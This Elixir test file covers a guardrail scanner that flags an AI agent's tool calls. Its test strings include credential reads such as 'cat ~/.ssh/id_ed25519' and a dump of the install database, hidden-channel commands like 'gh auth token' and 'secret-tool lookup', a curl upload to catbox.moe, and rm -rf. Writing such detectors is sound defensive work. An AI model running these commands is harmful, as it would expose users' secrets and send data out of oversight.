defmodule Arbiter.Guardrails.ScanTest do
  use ExUnit.Case, async: true

  alias Arbiter.Guardrails.Scan

  describe "tool_input/2: hidden channels (critical)" do
    test "flags an executed systemd-run, busctl or secret-tool" do
      for cmd <- ["systemd-run --user /bin/sh", "busctl --user list", "secret-tool lookup a b"] do
        assert [%{kind: :hidden_channel_attempt, severity: :critical}] =
                 Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "flags gh auth token, and sees through wrappers and pipelines" do
      assert [%{kind: :hidden_channel_attempt, match: "gh auth token"}] =
               Scan.tool_input("Bash", %{"command" => "cd x && FOO=1 sudo gh auth token | cat"})

      assert [%{match: "systemd-run"}] =
               Scan.tool_input("run_command", %{"command" => "env A=b /usr/bin/systemd-run x"})
    end

    test "does not flag prose or an argument that merely mentions the name" do
      assert [] = Scan.tool_input("Bash", %{"command" => "git commit -m 'block systemd-run'"})
      assert [] = Scan.tool_input("Bash", %{"command" => "grep -rn busctl lib"})
      assert [] = Scan.tool_input("Bash", %{"command" => "gh auth status"})
      assert [] = Scan.tool_input("Write", %{"content" => "systemd-run", "file_path" => "a.md"})
    end

    test "reads the command of a codex shell item the same way" do
      assert [%{kind: :hidden_channel_attempt}] =
               Scan.tool_input("shell", %{"command" => "busctl --user"})
    end
  end

  describe "tool_input/2: credential reads (major)" do
    test "flags a reader command on a credential dir or the install DB" do
      for cmd <- [
            "cat ~/.ssh/id_ed25519",
            "tar czf x.tgz $HOME/.aws",
            "sqlite3 /srv/arbiter/arbiter.sqlite3 .dump",
            "ls /home/ryan/.config/gh"
          ] do
        assert [%{kind: :credential_read, severity: :major}] =
                 Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "flags a file tool pointed at a credential path" do
      assert [%{kind: :credential_read}] =
               Scan.tool_input("Read", %{"file_path" => "/home/ryan/.ssh/config"})

      assert [] = Scan.tool_input("Read", %{"file_path" => "/work/lib/a.ex"})
    end

    test "does not flag ssh/git using the key, or a commit message" do
      assert [] = Scan.tool_input("Bash", %{"command" => "ssh -i ~/.ssh/id host true"})
      assert [] = Scan.tool_input("Bash", %{"command" => "git commit -m 'read ~/.ssh docs'"})
    end
  end

  describe "tool_input/2: heredocs and search terms are data" do
    test "heredoc body lines are not commands" do
      for cmd <- [
            "cat > docs/notes.md <<'EOF'\n# Notes\nsystemd-run is blocked by the jail now.\nEOF",
            "cat > /tmp/x.md <<EOF\ngh auth token is never used\nEOF",
            "cat > a.md <<-EOF\n\tdon't run busctl\n\tEOF",
            "cat <<\"EOF\" | wc -l\nsecret-tool lookup\nEOF\necho done"
          ] do
        assert [] = Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "a command after the heredoc is still scanned" do
      cmd = "cat > a.md <<'EOF'\nnotes\nEOF\nbusctl --user list"
      assert [%{match: "busctl"}] = Scan.tool_input("Bash", %{"command" => cmd})
    end

    test "a command on the heredoc's opening line is still scanned" do
      cmd = "cat <<EOF && systemd-run x\nbody\nEOF"
      assert [%{match: "systemd-run"}] = Scan.tool_input("Bash", %{"command" => cmd})
    end

    test "a quoted << is not a heredoc" do
      cmd = "echo '<<EOF'\nbusctl list\nEOF"
      assert [%{match: "busctl"}] = Scan.tool_input("Bash", %{"command" => cmd})
    end

    test "a search pattern naming a credential path is not a read" do
      for cmd <- [
            ~s(grep -rn "arbiter.sqlite3" docs/),
            "rg '~/.ssh' lib",
            "grep -e .config/gh -e .aws/ lib",
            "find . -name arbiter.sqlite3"
          ] do
        assert [] = Scan.tool_input("Bash", %{"command" => cmd})
      end
    end

    test "a search tool pointed at a credential path still flags" do
      assert [%{kind: :credential_read}] =
               Scan.tool_input("Bash", %{"command" => "grep -r token ~/.ssh"})

      assert [%{kind: :credential_read}] =
               Scan.tool_input("Bash", %{
                 "command" => "grep -e token /home/u/.config/gh/hosts.yml"
               })

      assert [%{kind: :credential_read}] =
               Scan.tool_input("Bash", %{"command" => "find /srv/arbiter/arbiter.sqlite3-wal"})
    end

    test "arbiter.sqlite3 must be a path component" do
      assert [] = Scan.tool_input("Bash", %{"command" => "cat notes-arbiter.sqlite3.md"})

      assert [%{match: "arbiter.sqlite3"}] =
               Scan.tool_input("Bash", %{"command" => "cat arbiter.sqlite3"})
    end
  end

  test "tool_input/2 is empty for junk input" do
    assert [] = Scan.tool_input("Bash", nil)
    assert [] = Scan.tool_input(nil, %{})
    assert [] = Scan.tool_input("Bash", %{"command" => 12})
  end

  describe "denial/2" do
    test "a safe-default category is major" do
      for cmd <- ["git push --force origin x", "git push -f", "rm -rf /tmp/x", "gh gist create a"] do
        assert %{kind: :permission_denial, severity: :major, category: cat} =
                 Scan.denial("Bash", %{"command" => cmd})

        assert is_binary(cat)
      end
    end

    test "a public upload host is critical" do
      assert %{kind: :public_upload_attempt, severity: :critical, category: "catbox.moe"} =
               Scan.denial("Bash", %{"command" => "curl -F f=@a https://files.catbox.moe/up"})

      assert %{kind: :public_upload_attempt} =
               Scan.denial("WebFetch", %{"url" => "https://pastebin.com/x"})
    end

    test "anything else is a minor permission denial" do
      assert %{kind: :permission_denial, severity: :minor, category: nil} =
               Scan.denial("Bash", %{"command" => "make deploy"})
    end
  end
end
